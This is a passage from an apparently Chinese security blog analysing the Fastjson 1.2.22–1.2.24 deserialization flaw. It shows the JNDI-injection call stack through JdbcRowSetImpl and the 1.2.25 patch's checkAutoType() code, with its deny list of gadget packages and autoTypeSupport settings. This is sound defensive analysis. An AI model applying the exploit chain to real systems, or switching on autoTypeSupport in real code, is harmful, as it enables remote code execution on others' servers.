再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。

调试过程的函数调用栈如下：

```
connect:654, JdbcRowSetImpl (com.sun.rowset)
setAutoCommit:4081, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:606, Method (java.lang.reflect)
setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseRest:922, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:137, JSON (com.alibaba.fastjson)
parse:128, JSON (com.alibaba.fastjson)
main:6, JdbcRowSetImplPoc
```

#### 一个小问题

这里漏洞触发点是`JSON.parse(payload);`，改成用`JSON.parse(payload);`也是可以成功利用的。

为啥会这样呢？其实看到之前讲解的parse与parseObject区别就知道了。

我们将JSON.parse()换成JSON.parseObject()再调试一遍会发现，JSON.parseObject()会调用到JSON.parse()、再调用DefaultJSONParser.parse()，也就是说JSON.parseObject()本质上还是调用JSON.parse()进行反序列化的，区别不过是parseObject()会额外调用JSON.toJSON()来将Java对象专为JSONObject对象。两者的反序列化的操作时一样的，因此都能成功触发。

## 0x03 补丁分析

这里下载1.2.25版本的jar包看下是怎么修补的。

### checkAutoType()

修补方案就是将DefaultJSONParser.parseObject()函数中的`TypeUtils.loadClass`替换为checkAutoType()函数：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/33.png)

看下checkAutoType()函数，具体的可看注释：

```
public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
    if (typeName == null) {
        return null;
    }

    final String className = typeName.replace('$', '.');

    // autoTypeSupport默认为False
    // 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤
    if (autoTypeSupport || expectClass != null) {
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                return TypeUtils.loadClass(typeName, defaultClassLoader);
            }
        }

        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
    }

    // 从Map缓存中获取类，注意这是后面版本的漏洞点
    Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
    if (clazz == null) {
        clazz = deserializers.findClass(typeName);
    }

    if (clazz != null) {
        if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
            throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
        }

        return clazz;
    }

    // 当autoTypeSupport未开启时，先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错
    if (!autoTypeSupport) {
        for (int i = 0; i < denyList.length; ++i) {
            String deny = denyList[i];
            if (className.startsWith(deny)) {
                throw new JSONException("autoType is not support. " + typeName);
            }
        }
        for (int i = 0; i < acceptList.length; ++i) {
            String accept = acceptList[i];
            if (className.startsWith(accept)) {
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader);

                if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
                    throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                }
                return clazz;
            }
        }
    }

    if (autoTypeSupport || expectClass != null) {
        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
    }

    if (clazz != null) {

        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
            || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
           ) {
            throw new JSONException("autoType is not support. " + typeName);
        }

        if (expectClass != null) {
            if (expectClass.isAssignableFrom(clazz)) {
                return clazz;
            } else {
                throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
            }
        }
    }

    if (!autoTypeSupport) {
        throw new JSONException("autoType is not support. " + typeName);
    }

    return clazz;
}
```

简单地说，checkAutoType()函数就是使用黑白名单的方式对反序列化的类型继续过滤，acceptList为白名单（默认为空，可手动添加），denyList为黑名单（默认不为空）。

默认情况下，autoTypeSupport为False，即先进行黑名单过滤，遍历denyList，如果引入的库以denyList中某个deny开头，就会抛出异常，中断运行。

denyList黑名单中列出了常见的反序列化漏洞利用链Gadgets：

```
bsh
com.mchange
com.sun.
java.lang.Thread
java.net.Socket
java.rmi
javax.xml
org.apache.bcel
org.apache.commons.beanutils
org.apache.commons.collections.Transformer
org.apache.commons.collections.functors
org.apache.commons.collections4.comparators
org.apache.commons.fileupload
org.apache.myfaces.context.servlet
org.apache.tomcat
org.apache.wicket.util
org.codehaus.groovy.runtime
org.hibernate
org.jboss
org.mozilla.javascript
org.python.core
org.springframework
```

这里可以看到黑名单中包含了”com.sun.”，这就把我们前面的几个利用链都给过滤了，成功防御了。

运行能看到报错信息，说autoType不支持该类：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/32.png)

调试分析看到，就是在checkAutoType()函数中未开启autoTypeSupport即默认设置的场景下被黑名单过滤了从而导致抛出异常程序终止的：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/34.png)

### autoTypeSupport

autoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。

默认情况下autoTypeSupport为False，将其设置为True有两种方法：

- JVM启动参数：`-Dfastjson.parser.autoTypeSupport=true`
- 代码中设置：`ParserConfig.getGlobalInstance().setAutoTypeSupport(true);`，如果有使用非全局ParserConfig则用另外调用`setAutoTypeSupport(true);`

AutoType白名单设置方法：

1. JVM启动参数：`-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.`
2. 代码中设置：`ParserConfig.getGlobalInstance().addAccept("com.xx.a");`
3. 通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：`fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.`